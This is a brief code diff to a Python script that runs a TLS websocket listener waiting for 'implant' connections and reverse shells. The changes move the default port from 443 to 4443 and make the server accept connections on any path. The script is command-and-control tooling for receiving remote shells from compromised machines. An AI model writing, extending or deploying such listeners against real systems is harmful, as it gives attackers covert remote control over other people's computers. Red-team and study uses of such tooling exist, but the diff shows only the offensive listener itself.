@@ -21,7 +21,7 @@ except ImportError:
     print("[!] pip install websockets")
     sys.exit(1)
 
-PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 443
+PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4443
 
 async def handler(ws):
     print(f"[*] Shell connected from {ws.remote_address}")
@@ -51,10 +51,10 @@ async def main():
     ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     ssl_ctx.load_cert_chain("cert.pem", "key.pem")
 
-    print(f"[*] Listening on wss://0.0.0.0:{PORT}/ws")
+    print(f"[*] Listening on wss://0.0.0.0:{PORT} (all paths)")
     print(f"[*] Waiting for implant connection...")
 
-    async with websockets.serve(handler, "0.0.0.0", PORT, ssl=ssl_ctx):
+    async with websockets.serve(handler, "0.0.0.0", PORT, ssl=ssl_ctx, process_request=lambda p, h: None):
         await asyncio.Future()
 
 if __name__ == "__main__":
